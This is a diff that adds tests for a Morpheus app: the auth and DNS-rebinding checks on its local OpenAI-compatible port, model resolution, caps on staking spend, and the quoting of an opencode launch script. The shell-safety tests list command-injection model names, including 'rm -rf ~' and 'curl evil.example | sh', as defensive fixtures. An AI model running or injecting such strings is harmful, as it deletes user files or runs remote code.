@@ -14,6 +14,25 @@ import {
 } from '../../src/renderer/src/utils/marketplace.ts';
 import { formatMor } from '../../src/renderer/src/utils/coinValue.tsx';
 import {
+  admitRequest,
+  bearerMatches,
+  toModelList,
+  resolveModel,
+  routingHeaders,
+  errorBody,
+} from '../../src/main/src/openai-compat/protocol.ts';
+import {
+  buildMorpheusConfig,
+  buildLaunchScript,
+  shellQuote,
+} from '../../src/main/src/opencode/setup.ts';
+import {
+  checkCaps,
+  spentToday,
+  stakeForDuration,
+  buildCatalog,
+} from '../../src/main/src/openai-compat/sessions-api.ts';
+import {
   MIN_REQUEST_SECONDS,
   strideSeconds,
   blocksForDuration,
@@ -711,6 +730,288 @@ console.log('queries: a chained run stops at the length that was sold');
   ok('the default unit still prices a single minimum block as 1',
     planBlocks(MIN_REQUEST_SECONDS, true).length === 1 &&
     planBlocks(MIN_REQUEST_SECONDS, false).length === 1);
+}
+
+// ---- the OpenAI-compatible facade -------------------------------------------
+// This is a local HTTP port. Its admission checks are the security boundary, so
+// they are pinned adversarially rather than happy-path.
+//
+// The posture worth restating: the port is spend-inert by default (it never
+// opens a blockchain session unless explicitly enabled), because auth cannot
+// defend against same-user local malware. These checks cover the attackers auth
+// CAN stop: a web page, a rebinding host, and a wrong or absent key.
+console.log('');
+console.log('openai-compat: who is allowed to talk to the port');
+{
+  const TOKEN = 'mor-sk-0123456789abcdef0123456789abcdef';
+  const PORT = 8137;
+  const ok_ = (h) => admitRequest(h, TOKEN, PORT);
+  const good = { authorization: `Bearer ${TOKEN}`, host: `127.0.0.1:${PORT}` };
+
+  ok('a correct key over loopback is admitted', ok_(good).ok === true);
+  ok('localhost:<port> is loopback too',
+    ok_({ ...good, host: `localhost:${PORT}` }).ok === true);
+  ok('IPv6 loopback is accepted', ok_({ ...good, host: `[::1]:${PORT}` }).ok === true);
+  ok('bearer is case-insensitive (clients differ)',
+    ok_({ ...good, authorization: `bearer ${TOKEN}` }).ok === true);
+
+  // The key.
+  ok('no Authorization header is refused', ok_({ ...good, authorization: null }).status === 401);
+  ok('a wrong key is refused', ok_({ ...good, authorization: 'Bearer nope' }).status === 401);
+  ok('Basic auth is not a bearer token', ok_({ ...good, authorization: 'Basic abc' }).status === 401);
+  ok('an empty bearer is refused', ok_({ ...good, authorization: 'Bearer ' }).status === 401);
+  // A prefix of the real key must not pass — the guard against a sloppy
+  // startsWith/substring comparison.
+  ok('a prefix of the key is refused',
+    ok_({ ...good, authorization: `Bearer ${TOKEN.slice(0, -1)}` }).status === 401);
+
+  // DNS rebinding: the attacker's page resolves their hostname to 127.0.0.1, so
+  // binding to loopback does NOT keep them out — the Host header does.
+  ok('a rebinding Host is refused', ok_({ ...good, host: 'evil.example' }).status === 403);
+  ok('a rebinding Host on the right port is still refused',
+    ok_({ ...good, host: `evil.example:${PORT}` }).status === 403);
+  ok('a missing Host is refused', ok_({ ...good, host: null }).status === 403);
+  ok('loopback on the WRONG port is refused',
+    ok_({ ...good, host: `127.0.0.1:${PORT + 1}` }).status === 403);
+
+  // Browsers always send Origin cross-origin; CLI tools never do.
+  ok('any Origin is refused', ok_({ ...good, origin: 'https://evil.example' }).status === 403);
+  ok('Origin is refused even WITH a valid key (a leaked key in a page)',
+    ok_({ ...good, origin: 'http://localhost:3000' }).ok === false);
+  // Order matters: Origin is checked before the key, so a page cannot use a
+  // stolen token even once.
+  ok('Origin outranks a bad key (checked first)',
+    ok_({ authorization: 'Bearer wrong', host: 'evil.example', origin: 'https://e.x' }).code === 'origin_not_allowed');
+
+  ok('constant-time compare still returns the right answer',
+    bearerMatches(TOKEN, TOKEN) === true &&
+    bearerMatches(TOKEN + 'x', TOKEN) === false &&
+    bearerMatches('', TOKEN) === false &&
+    bearerMatches(TOKEN, '') === false);
+}
+
+console.log('');
+console.log('openai-compat: models a client can actually use');
+{
+  const local = { id: '0xaaa1', name: 'llama-3-8b', isLocal: true };
+  const remote = { id: '0xbbb2', name: 'deepseek-v4', isLocal: false, sessionId: '0xsess' };
+  const dupA = { id: '0xccc3333333', name: 'shared-name', isLocal: false, sessionId: '0xs1' };
+  const dupB = { id: '0xddd4444444', name: 'shared-name', isLocal: false, sessionId: '0xs2' };
+
+  const list = toModelList([local, remote], 1700000000);
+  ok('the list is OpenAI-shaped', list.object === 'list' && Array.isArray(list.data));
+  ok('entries carry the required fields',
+    list.data.every((e) => e.id && e.object === 'model' && typeof e.created === 'number' && e.owned_by));
+  ok('unique names are advertised bare', list.data.some((e) => e.id === 'llama-3-8b'));
+  ok('local vs marketplace is distinguishable',
+    list.data.find((e) => e.id === 'llama-3-8b').owned_by === 'morpheus-local' &&
+    list.data.find((e) => e.id === 'deepseek-v4').owned_by === 'morpheus-marketplace');
+
+  // Morpheus names are NOT unique; OpenAI clients treat `model` as a key.
+  const dupList = toModelList([dupA, dupB], 1700000000);
+  ok('colliding names are disambiguated, not deduped',
+    dupList.data.length === 2 && new Set(dupList.data.map((e) => e.id)).size === 2);
+  ok('and the disambiguated form resolves back',
+    resolveModel(dupList.data[0].id, [dupA, dupB]).ok === true);
+
+  // Resolution.
+  ok('a bare unique name resolves', resolveModel('llama-3-8b', [local, remote]).model.id === '0xaaa1');
+  ok('a raw hex id always resolves', resolveModel('0xbbb2', [local, remote]).model.id === '0xbbb2');
+  ok('hex resolution is case-insensitive', resolveModel('0xBBB2', [local, remote]).ok === true);
+  ok('an empty model is refused', resolveModel('', [local, remote]).code === 'model_required');
+  ok('an unknown model lists what IS available',
+    /llama-3-8b/.test(resolveModel('gpt-4', [local, remote]).message));
+
+  // The important refusal: never silently pick one of two same-named models —
+  // that would route the prompt, and a marketplace model's staked capacity, at
+  // a provider the user did not choose.
+  const amb = resolveModel('shared-name', [dupA, dupB]);
+  ok('an ambiguous bare name is REFUSED, not guessed', amb.ok === false && amb.code === 'model_ambiguous');
+  ok('and the refusal names the alternatives', /shared-name:/.test(amb.message));
+
+  // Routing headers: the router routes from headers only.
+  ok('a local model sends model_id and NO session_id',
+    routingHeaders(local).model_id === '0xaaa1' && !('session_id' in routingHeaders(local)));
+  ok('a remote model sends its session_id',
+    routingHeaders(remote).session_id === '0xsess');
+
+  ok('errors use the OpenAI envelope', (() => {
+    const e = JSON.parse(errorBody('nope', 'model_not_found'));
+    return e.error && e.error.message === 'nope' && e.error.code === 'model_not_found';
+  })());
+}
+
+// ---- the spend caps ----------------------------------------------------------
+// These are the enforcement behind /start. The TUI confirmation stops the AGENT
+// (a model cannot press a key); these stop everything else — a plugin bug, a
+// mis-parsed duration, a loop that skips the dialog. They live in the app and
+// cannot be raised over the wire, so they are the last line before a real
+// transaction.
+console.log('');
+console.log('sessions: spend caps are the enforcement, not the dialog');
+{
+  const caps = { maxStakeMor: 10, maxDailyStakeMor: 25 };
+  const now = Date.UTC(2026, 7, 6, 15, 0, 0);
+  const noLedger = [];
+
+  ok('a stake inside both limits is allowed',
+    checkCaps(5, caps, noLedger, now).allowed === true);
+  ok('a stake over the per-session cap is refused',
+    checkCaps(11, caps, noLedger, now).allowed === false);
+  ok('and the refusal names the limit that bound',
+    /per-session limit of 10 MOR/.test(checkCaps(11, caps, noLedger, now).reason));
+  ok('exactly at the cap is allowed (a ceiling, not a fence)',
+    checkCaps(10, caps, noLedger, now).allowed === true);
+
+  // The daily ledger.
+  const today = [
+    { at: now - 3600_000, stakeMor: 9, sessionId: 'a' },
+    { at: now - 7200_000, stakeMor: 8, sessionId: 'b' },
+  ];
+  ok("today's spend accumulates", spentToday(today, now) === 17);
+  ok('a stake that would breach the DAILY cap is refused',
+    checkCaps(9, caps, today, now).allowed === false);
+  ok('and that refusal names the daily limit and what is already spent',
+    /daily limit of 25 MOR/.test(checkCaps(9, caps, today, now).reason) &&
+    /17\.00 already staked/.test(checkCaps(9, caps, today, now).reason));
+  ok('a stake that fits under the daily cap is allowed',
+    checkCaps(8, caps, today, now).allowed === true);
+
+  // Yesterday's spend must not count against today, or the cap ratchets shut.
+  const yesterday = [{ at: now - 30 * 3600_000, stakeMor: 24, sessionId: 'old' }];
+  ok('yesterday does not count against today',
+    spentToday(yesterday, now) === 0 &&
+    checkCaps(9, caps, yesterday, now).allowed === true);
+
+  // Degenerate prices must FAIL CLOSED — an unpriceable session is exactly the
+  // case where an unbounded amount could be staked.
+  ok('an unpriceable stake is refused', checkCaps(NaN, caps, noLedger, now).allowed === false);
+  ok('a zero stake is refused', checkCaps(0, caps, noLedger, now).allowed === false);
+  ok('a negative stake is refused', checkCaps(-5, caps, noLedger, now).allowed === false);
+
+  // The quote must match the chain's formula, or the confirmation screen lies.
+  // supply/budget = 1, price 1e15 wei/s, 1 hour -> 1e15 * 3600 / 1e18 = 3.6 MOR.
+  ok('the quote mirrors the router formula',
+    Math.abs(stakeForDuration('1000000000000000', 3600, 1, 1) - 3.6) < 1e-9);
+  ok('a zero budget does not divide by zero into a fake price',
+    !Number.isFinite(stakeForDuration('1000000000000000', 3600, 1, 0)));
+
+  // The catalog drops models nothing can serve — a picker entry that cannot
+  // open a session is a dead end the user pays attention to for nothing.
+  const catalog = buildCatalog(
+    [{ Id: '0xm1', Name: 'has-providers' }, { Id: '0xm2', Name: 'no-providers' }],
+    new Map([['0xm1', [{ Id: '0xb1', Provider: '0xp1', PricePerSecond: '1000000000000000' }]]]),
+    1,
+    1,
+  );
+  ok('the catalog lists only models with a provider',
+    catalog.length === 1 && catalog[0].name === 'has-providers');
+  ok('and quotes an hourly price a human can read',
+    Math.abs(catalog[0].providers[0].stakeMorPerHour - 3.6) < 1e-9);
+}
+
+// ---- opencode handoff --------------------------------------------------------
+// The app writes an opencode config and builds a shell line that a terminal runs.
+// Two things must hold: the config matches what opencode expects (or the handoff
+// silently does nothing), and the shell line is safe for arbitrary model names —
+// anyone can register a model on-chain with any name they like, and that name
+// ends up in a command.
+console.log('');
+console.log('opencode: the config and the command we hand a terminal');
+{
+  const cfg = JSON.parse(buildMorpheusConfig({
+    baseUrl: 'http://127.0.0.1:8137/v1',
+    apiKey: 'mor-sk-secret',
+    models: [
+      { id: 'deepseek-v4', label: 'DeepSeek V4' },
+      { id: 'local-llama', label: 'Local Llama' },
+    ],
+  }));
+
+  ok('it declares the generic OpenAI-compatible adapter',
+    cfg.provider.morpheus.npm === '@ai-sdk/openai-compatible');
+  ok('it points at our local endpoint',
+    cfg.provider.morpheus.options.baseURL === 'http://127.0.0.1:8137/v1');
+  ok('it carries the endpoint key', cfg.provider.morpheus.options.apiKey === 'mor-sk-secret');
+  // opencode requires model keys to equal the ids from GET /v1/models; if these
+  // drift the provider appears but every model 404s.
+  ok('model keys are the ids /v1/models advertises',
+    Object.keys(cfg.provider.morpheus.models).sort().join(',') === 'deepseek-v4,local-llama');
+  ok('models carry a human label', cfg.provider.morpheus.models['deepseek-v4'].name === 'DeepSeek V4');
+
+  // ---- shell safety ----
+  ok('a plain model builds the expected command', (() => {
+    const s = buildLaunchScript({
+      opencodePath: '/opt/homebrew/bin/opencode',
+      configPath: '/tmp/morpheus.json',
+      modelId: 'deepseek-v4',
+      cwd: '/Users/me/project',
+    });
+    return /exec '\/opt\/homebrew\/bin\/opencode' -m 'morpheus\/deepseek-v4'/.test(s)
+      && /export OPENCODE_CONFIG='\/tmp\/morpheus\.json'/.test(s)
+      && /cd '\/Users\/me\/project'/.test(s);
+  })());
+
+  // The config path is set via the env var — never by editing the user's own
+  // opencode.jsonc, which we must not touch.
+  ok('the handoff uses OPENCODE_CONFIG rather than the user config', (() => {
+    const s = buildLaunchScript({
+      opencodePath: '/x/opencode', configPath: '/y/c.json', modelId: 'm', cwd: '/z',
+    });
+    return s.includes('OPENCODE_CONFIG=') && !s.includes('.config/opencode/opencode.jsonc');
+  })());
+
+  ok('single quotes are escaped, not dropped',
+    shellQuote(`it's`) === `'it'\\''s'`);
+
+  // The injection cases. A model name is chain data; treat it as hostile.
+  // Shell metacharacters must be QUOTED (they are legal in a name); control
+  // characters must be REFUSED outright (they are not, and a multi-line token in
+  // a generated .command file is unreviewable).
+  const hostile = [
+    "evil'; rm -rf ~; echo '",
+    'evil$(whoami)',
+    'evil`id`',
+    'evil && curl evil.example | sh',
+    'evil"; rm -rf ~; "',
+  ];
+  let leaked = null;
+  for (const modelId of hostile) {
+    const s = buildLaunchScript({
+      opencodePath: '/opt/homebrew/bin/opencode',
+      configPath: '/tmp/c.json',
+      modelId,
+      cwd: '/tmp',
+    });
+    const execLine = s.split('\n').find((l) => l.startsWith('exec ')) ?? '';
+    // Everything after `-m ` must be ONE single-quoted token: no unescaped
+    // quote may close it early, and no metacharacter may escape it.
+    const arg = execLine.slice(execLine.indexOf(' -m ') + 4);
+    const wellFormed = /^'(?:[^']|'\\'')*'$/.test(arg);
+    if (!wellFormed) leaked = { modelId, arg };
+  }
+  ok('a hostile model name cannot break out of its quoting',
+    leaked === null, leaked && JSON.stringify(leaked));
+
+  // Control characters are refused rather than quoted. Quoting WOULD make them
+  // safe, but the resulting command spans lines and cannot be reviewed by eye.
+  const refuses = (input) => {
+    try {
+      buildLaunchScript(input);
+      return false;
+    } catch {
+      return true;
+    }
+  };
+  ok('a newline in a model name is REFUSED, not quoted',
+    refuses({ opencodePath: '/o', configPath: '/c', modelId: 'a\nrm -rf ~', cwd: '/t' }));
+  ok('a control character anywhere is refused',
+    refuses({ opencodePath: '/o', configPath: '/c\u0000', modelId: 'm', cwd: '/t' }) &&
+    refuses({ opencodePath: '/o', configPath: '/c', modelId: 'm', cwd: '/t\r' }));
+  // And ordinary names with hyphens must still work — the guard must not be so
+  // broad it rejects real model ids.
+  ok('a normal hyphenated model id still builds',
+    !refuses({ opencodePath: '/o', configPath: '/c', modelId: 'deepseek-v4', cwd: '/t' }));
 }
 
 // ---- the model-registry snapshot --------------------------------------------
